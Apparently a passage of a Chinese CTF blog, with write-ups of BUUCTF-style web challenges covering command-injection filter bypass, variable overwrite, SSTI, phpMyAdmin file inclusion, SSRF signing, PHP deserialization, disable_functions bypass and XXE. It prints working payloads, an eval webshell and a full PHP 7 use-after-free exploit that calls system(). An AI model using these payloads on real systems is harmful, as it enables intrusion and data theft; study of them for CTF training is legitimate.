$_GET[\u0026#39;cmd\u0026#39;]; if (!isset($_GET[\u0026#39;img\u0026#39;]) || !isset($_GET[\u0026#39;cmd\u0026#39;])) header(\u0026#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026amp;cmd=\u0026#39;); $file = hex2bin(base64_decode(base64_decode($_GET[\u0026#39;img\u0026#39;]))); $file = preg_replace(\u0026#34;/[^a-zA-Z0-9.]+/\u0026#34;, \u0026#34;\u0026#34;, $file); if (preg_match(\u0026#34;/flag/i\u0026#34;, $file)) { echo \u0026#39;\u0026lt;img src =\u0026#34;./ctf3.jpeg\u0026#34;\u0026gt;\u0026#39;; die(\u0026#34;xixi～ no flag\u0026#34;); } else { $txt = base64_encode(file_get_contents($file)); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/gif;base64,\u0026#34; . $txt . \u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } echo $cmd; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if (preg_match(\u0026#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\\u0026#39;|\\\u0026#34;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u0026lt;|\u0026gt;/i\u0026#34;, $cmd)) { echo(\u0026#34;forbid ~\u0026#34;); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if ((string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { echo `$cmd`; } else { echo (\u0026#34;md5 is funny ~\u0026#34;); } } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;style\u0026gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC; } \u0026lt;/style\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 我不知道为什么，我的bp一定要在\u0026amp;前加一个空格才可以通过。\n1 2 3 4 5 ?cmd=uniq%20/flag POST a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 \u0026amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 读文件的绕过有\n1 more:一页一页的显示档案内容 2 less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页 3 head:查看头几行 4 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 5 tail:查看尾几行 6 nl：显示的时候，顺便输出行号 7 od:以二进制的方式读取档案内容 8 vi:一种编辑器，这个也可以查看 9 vim:一种编辑器，这个也可以查看 10 sort:可以查看 11 uniq:可以查看 12 file -f:报错出具体内容 摘自命令执行漏洞利用及绕过方式总结。\n[BJDCTF2020]Mark loves cat git泄露\nflag.php\n1 2 3 \u0026lt;?php $flag = file_get_contents(\u0026#39;/flag\u0026#39;); index.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; 尝试输出$flag即可。exit()函数退出时也会输出。\n第一个不可能实现，如果POST或GET传入flag的话必然导致$flag修改，那么正好符合第二个if。\npayload\n1 2 3 4 5 GET ?yds=flag POST(任意，但是需要保证不传flag) is=233flag [BJDCTF2020]The mystery of ip hint.php里面有注释\nDo you know why i know your ip?\n去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。\n尝试了几个ssti的payload不行，但是提示了\nUncaught \u0026ndash;\u0026gt; Smarty Compiler:\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\n得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入\n1 2 请求： X-Forwarded-For: {system(\u0026#39;cat /flag\u0026#39;)} SSTI神器–Tplmap，看介绍是和sqlmap差不多的工具。\n这个师傅的博客写的很全：https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。\nCTF SSTI(服务器模板注入)\nflask之ssti模版注入从零到入门\n[GWCTF 2019]我有一个数据库 页面是乱码，想知道内容了可以看下图\n$$各种乱码图\n对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存\u0026ndash;\u0026gt;GBK，再通过编码打开\u0026ndash;\u0026gt;UTF-8。内容如下\n我有一个数据库，但里面什么也没有~ 不信你找\n提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞\nphpmyadmin4.8.1后台getshell\npayload\n1 /phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag 可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称\n2021.03.01 [BJDCTF2020]ZJCTF，不过如此 绕过\n第一层用php伪协议中的data封装流。PHP伪协议总结\n然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter\npayload\n1 ?text=data://text/plain,I have a dream\u0026amp;file=php://filter/convert.base64-encode/resource=next.php 读出来的next.php\n1 PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K base64解码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace( \u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $str ); } foreach($_GET as $re =\u0026gt; $str) { echo complex($re, $str). \u0026#34;\\n\u0026#34;; } function getFlag(){ @eval($_GET[\u0026#39;cmd\u0026#39;]); } 这里想要通过需要知道一个深入研究 preg_replace /e 模式下的代码漏洞问题\n最终payload\n1 next.php?\\S*=${getFlag()}\u0026amp;cmd=system(\u0026#39;cat /flag\u0026#39;); [De1CTF 2019]SSRF Me 进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 #! /usr/bin/env python # encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(\u0026#39;latin1\u0026#39;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if (not os.path.exists(self.sandbox)): # SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result[\u0026#39;code\u0026#39;] = 500 if (self.checkSign()): if \u0026#34;scan\u0026#34; in self.action: tmpfile = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;w\u0026#39;) resp = scan(self.param) # 此处是文件读取得注入点 if (resp == \u0026#34;Connection Timeout\u0026#34;): result[\u0026#39;data\u0026#39;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[\u0026#39;code\u0026#39;] = 200 if \u0026#34;read\u0026#34; in self.action: f = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;r\u0026#39;) result[\u0026#39;code\u0026#39;] = 200 result[\u0026#39;data\u0026#39;] = f.read() if result[\u0026#39;code\u0026#39;] == 500: result[\u0026#39;data\u0026#39;] = \u0026#34;Action Error\u0026#34; else: result[\u0026#39;code\u0026#39;] = 500 result[\u0026#39;msg\u0026#39;] = \u0026#34;Sign Error\u0026#34; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False # generate Sign For Action Scan. @app.route(\u0026#34;/geneSign\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def geneSign(): param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) action = \u0026#34;scan\u0026#34; return getSign(action, param) @app.route(\u0026#39;/De1ta\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def challenge(): action = urllib.unquote(request.cookies.get(\u0026#34;action\u0026#34;)) param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) sign = urllib.unquote(request.cookies.get(\u0026#34;sign\u0026#34;)) ip = request.remote_addr if (waf(param)): return \u0026#34;No Hacker!!!!\u0026#34; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(\u0026#39;/\u0026#39;) def index(): return open(\u0026#34;code.txt\u0026#34;, \u0026#34;r\u0026#34;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \u0026#34;Connection Timeout\u0026#34; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check = param.strip().lower() if check.startswith(\u0026#34;gopher\u0026#34;) or check.startswith(\u0026#34;file\u0026#34;): return True else: return False if __name__ == \u0026#39;__main__\u0026#39;: app.debug = False app.run(host=\u0026#39;0.0.0.0\u0026#39;) 简单说明思路：\n请求部分(代码69-78)：\n获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参 读取文件需要在cookie里传入参数action、sign action是执行类型，代码33行和43行指出了两种。 sing是用来验证param和action的，相关函数在94行，稍后做解释 获取sign部分(61-66)\n获取param，action固定为scan 返回(secert_key + param + action)组合的sign 所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。\n假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用|仅为说明使用，其实字符串是相连的)\n1 secert_key|flag.txt|scan 但是我们想要使用read，可以构造param为flag.txtread\n1 secert_key|flag.txtread|scan 再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。\n1 secert_key|flag.txt|readscan 请求/geneSign\n1 /geneSign?param=flag.txtread 得到\n1 9017a8826b7267833f22c0f22d90fea7 得到sign以后，再去访问/De1ta\n1 2 3 /De1ta?param=flag.txt sign=9017a8826b7267833f22c0f22d90fea7;action=readscan; 获得flag\n[网鼎杯 2020 朱雀组]phpweb 看源码，有一个表单和自动提交的js。表单参数为\n1 func=date\u0026amp;p=Y-m-d+h%3Ai%3As+a 是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php $disable_fun = array(\u0026#34;exec\u0026#34;,\u0026#34;shell_exec\u0026#34;,\u0026#34;system\u0026#34;,\u0026#34;passthru\u0026#34;,\u0026#34;proc_open\u0026#34;,\u0026#34;show_source\u0026#34;,\u0026#34;phpinfo\u0026#34;,\u0026#34;popen\u0026#34;,\u0026#34;dl\u0026#34;,\u0026#34;eval\u0026#34;,\u0026#34;proc_terminate\u0026#34;,\u0026#34;touch\u0026#34;,\u0026#34;escapeshellcmd\u0026#34;,\u0026#34;escapeshellarg\u0026#34;,\u0026#34;assert\u0026#34;,\u0026#34;substr_replace\u0026#34;,\u0026#34;call_user_func_array\u0026#34;,\u0026#34;call_user_func\u0026#34;,\u0026#34;array_filter\u0026#34;, \u0026#34;array_walk\u0026#34;, \u0026#34;array_map\u0026#34;,\u0026#34;registregister_shutdown_function\u0026#34;,\u0026#34;register_tick_function\u0026#34;,\u0026#34;filter_var\u0026#34;, \u0026#34;filter_var_array\u0026#34;, \u0026#34;uasort\u0026#34;, \u0026#34;uksort\u0026#34;, \u0026#34;array_reduce\u0026#34;,\u0026#34;array_walk\u0026#34;, \u0026#34;array_walk_recursive\u0026#34;,\u0026#34;pcntl_exec\u0026#34;,\u0026#34;fopen\u0026#34;,\u0026#34;fwrite\u0026#34;,\u0026#34;file_put_contents\u0026#34;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \u0026#34;string\u0026#34;) { return $result; } else {return \u0026#34;\u0026#34;;} } class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } $func = $_REQUEST[\u0026#34;func\u0026#34;]; $p = $_REQUEST[\u0026#34;p\u0026#34;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\u0026#34;Hacker...\u0026#34;); } } ?\u0026gt; 我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。\n先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php class Test { var $p = \u0026#34;ls ../../../../\u0026#34;; var $func = \u0026#34;system\u0026#34;; } $s=new Test(); echo urlencode(serialize($s)); #unserialize O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D wp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93\n1 2 POST func=unserialize\u0026amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D 最后读文件\n1 func=readfile\u0026amp;p=../../../../tmp/flagoefiu4r93 [GKCTF2020]CheckIN 是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以\n1 2 phpinfo(); cGhwaW5mbygpOw== 查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数\n可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。\nscandir根目录查看\n1 ?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7 又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件\n传码\n1 2 eval($_POST[1]); ZXZhbCgkX1BPU1RbMV0pOw== 蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道RCE ME也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 \u0026lt;?php # PHP 7.0-7.3 disable_functions bypass PoC (*nix only) # # Bug: https://bugs.php.net/bug.php?id=72530 # # This exploit should work on all PHP 7.0-7.3 versions # # Author: https://github.com/mm0r1 pwn(\u0026#34;../../.././readflag\u0026#34;); #这里是想要执行的命令 function pwn($cmd) { global $abc, $helper; function str2ptr(\u0026amp;$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j \u0026gt;= 0; $j--) { $address \u0026lt;\u0026lt;= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \u0026#34;\u0026#34;; for ($i=0; $i \u0026lt; $m; $i++) { $out .= chr($ptr \u0026amp; 0xff); $ptr \u0026gt;\u0026gt;= 8; } return $out; } function write(\u0026amp;$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i \u0026lt; $n; $i++) { $str[$p + $i] = chr($v \u0026amp; 0xff); $v \u0026gt;\u0026gt;= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-\u0026gt;a); if($s != 8) { $leak %= 2 \u0026lt;\u0026lt; ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i \u0026lt; $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i \u0026lt; $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); # \u0026#39;constant\u0026#39; constant check if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); # \u0026#39;bin2hex\u0026#39; constant check if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak \u0026amp; 0xfffffffffffff000; for($i = 0; $i \u0026lt; 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { # ELF header return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { # system return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } class ryat { var $ryat; var $chtg; function __destruct() { $this-\u0026gt;chtg = $this-\u0026gt;ryat; $this-\u0026gt;ryat = 1; } } class Helper { public $a, $b, $c, $d; } if(stristr(PHP_OS, \u0026#39;WIN\u0026#39;)) { die(\u0026#39;This PoC is for *nix systems only.\u0026#39;); } $n_alloc = 10; # increase this value if you get segfaults $contiguous = []; for($i = 0; $i \u0026lt; $n_alloc; $i++) $contiguous[] = str_repeat(\u0026#39;A\u0026#39;, 79); $poc = \u0026#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\u0026#34;ryat\u0026#34;:2:{s:4:\u0026#34;ryat\u0026#34;;R:3;s:4:\u0026#34;chtg\u0026#34;;i:2;}}i:1;i:3;i:2;R:5;}\u0026#39;; $out = unserialize($poc); gc_collect_cycles(); $v = []; $v[0] = ptr2str(0, 79); unset($v); $abc = $out[2][0]; $helper = new Helper; $helper-\u0026gt;b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\u0026#34;UAF failed\u0026#34;); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\u0026#34;Couldn\u0026#39;t determine binary base address\u0026#34;); } if(!($elf = parse_elf($base))) { die(\u0026#34;Couldn\u0026#39;t parse ELF header\u0026#34;); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\u0026#34;Couldn\u0026#39;t get basic_functions address\u0026#34;); } if(!($zif_system = get_system($basic_funcs))) { die(\u0026#34;Couldn\u0026#39;t get zif_system address\u0026#34;); } # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i \u0026lt; 0x110; $i += 8) { write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); } # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-\u0026gt;b)($cmd); exit(); } 在蚁剑可以看出tmp文件夹权限可以上传，上传以后使用文件包含输出执行结果。文件包含payload\n1 ?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs= 03.02 [NCTF2019]Fake XML cookbook 根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。\n使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目\n1 2 3 4 5 POST Content-Type: application/xml; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;1\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;2\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 去摸一个payload试试\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY admin SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;admin;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 成功读取文件\n把路径改为/flag，获得flag\n[ASIS 2019]Unicorn shop 这道题绝活。学到了unicode的安全问题：浅谈Unicode设计的安全性，看了wp。\n进入网站一个本杰明·富兰克林至理名言：\n金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多\n差点信了，我就要赚钱花(小声bb)\n下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示 ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。\n一个和unicode有关的网站：https://www.compart.com/en/unicode\n网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：Ctrl+F搜索thousand，找1377以上的都可。\n我选的是这个፼数值是1w，直接传传不过去，使用url编码一次再传。\n[BJDCTF2020]Cookie is so stable 这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有\nWhy not take a closer look at cookies?\n去flag.php提交个1之后，看cookie为\n1 Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1 一目了然，接下来就是找payload。再使用之前的\n1 {system(\u0026#39;cat /flag\u0026#39;)} 被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload\n1 {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;whoami\u0026#34;)}} 我是受了这位师傅的文章启发，又去结合了下这道题的源码才搞明白。\n这道题在渲染之前使用了twig模板：\nTwig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。\n我同样在题目的源码中找到了render()方法和Twig_Environment配置信息\n然后payload的具体原理在的Environment.php中,贴一下和payload相关部分：\n先执行{{_self.env.registerUndefinedFilterCallback(\u0026quot;exec\u0026quot;)}}调用了registerUndefinedFilterCallback()函数(图中884行)，注册了一个未定义的函数到filterCallbacks全局变量中 接着执行{{_self.env.getFilter(\u0026quot;whoami\u0026quot;)}}调用了getFilter()函数，并传入变量$name值为执行的命令，当函数执行到图中代码875行时，进入循环执行了call_user_func()，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的filterCallbacks全局变量，里边已经躺好了一个刚刚注册的exec，至此就形成了payload 小彩蛋 现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了\n挺草的记一下。\n[CISCN 2019 初赛]Love Math 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[\u0026#39;c\u0026#39;])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET[\u0026#39;c\u0026#39;]; if (strlen($content) \u0026gt;= 80) { die(\u0026#34;太长了不会算\u0026#34;); } $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { die(\u0026#34;请不要输入奇奇怪怪的字符\u0026#34;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, 